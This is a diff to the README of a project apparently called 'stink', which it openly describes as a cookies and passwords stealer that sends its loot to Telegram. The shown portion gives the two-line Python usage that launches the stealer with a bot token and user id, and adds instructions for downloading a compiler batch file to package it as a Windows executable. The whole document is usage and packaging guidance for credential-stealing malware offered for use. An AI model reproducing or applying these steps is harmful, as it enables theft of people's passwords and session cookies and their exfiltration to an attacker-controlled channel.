@@ -23,7 +23,8 @@ Cookies and passwords stealer in just 2 lines. Sending to Telegram.
   * [Getting id](#Getting-id)
 * [Creating exe](#Creating-exe)
   * [Creating executable file](#Creating-executable-file)
-  * [CMD](#CMD)
+  * [With BAT](#With-BAT)
+  * [With CMD](#With-CMD)
 * [Сompression exe](#Сompression-exe)
   * [Disadvantages](#Disadvantages)
   * [WinRAR](#WinRAR)
@@ -142,7 +143,12 @@ from stink.multistealer import Stealer
 Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
 
-### CMD
+#### With BAT
+1. Download [compiler](https://github.com/FallenAstaroth/stink/releases/download/v1.2.1/compiler.bat).
+2. Move it to the same directory as the test.py file.
+3. Run compiler.bat.
+
+#### With CMD
 1. Open `cmd`.
 2. Type in the command:
 ```
